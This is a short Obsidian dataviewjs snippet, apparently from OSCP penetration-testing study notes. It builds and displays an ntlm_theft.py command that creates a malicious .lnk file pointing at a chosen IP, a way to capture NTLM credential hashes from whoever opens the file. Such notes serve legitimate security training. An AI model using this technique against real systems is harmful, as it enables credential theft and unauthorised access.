
Create vault.lnk
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `cd ~/Desktop/Tools/Windows && python3 ntlm_theft.py -g lnk -s ${ip} -f vault`;

dv.paragraph("```bash\n" + command + "\n```");
```